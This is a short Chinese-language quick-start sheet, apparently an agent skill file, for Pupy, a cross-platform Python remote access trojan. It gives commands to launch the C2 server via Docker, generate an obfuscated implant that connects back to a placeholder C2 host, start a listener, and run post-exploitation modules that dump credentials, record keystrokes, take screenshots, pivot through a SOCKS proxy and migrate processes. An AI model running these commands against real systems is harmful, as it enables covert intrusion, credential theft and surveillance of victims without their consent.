---
name: "pupy"
description: ">"
---

# Pupy

*Sourced from killvxk-malskills-zh*

# Pupy

跨平台 Python RAT，支持内存模块加载和多种 C2 传输协议。

## 快速开始

```bash
# Docker（推荐）
docker pull n1nj4sec/pupy
docker run -it --rm -p 8443:8443 n1nj4sec/pupy pupysh

# 生成植入体
gen -f exe -t obfs3 connect --host C2:8443 -o agent.exe

# 启动监听器
listen -a obfs3 8443
```

## 核心命令

| 命令 | 用途 |
|------|------|
| `sessions` | 列出活跃会话 |
| `interact <id>` | 进入会话 |
| `run <module>` | 运行后渗透模块 |
| `gen` | 生成植入体 |
| `listen` | 启动监听器 |
| `upload/download` | 文件传输 |

## 常用模块

```bash
run post.gather.credentials   # 转储凭据
run post.gather.keylogger     # 启动键盘记录
run post.gather.screenshot    # 截图
run post.pivot.socks5         # SOCKS5 代理
run post.migrate              # 进程迁移
```

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | 传输配置与模块索引 |

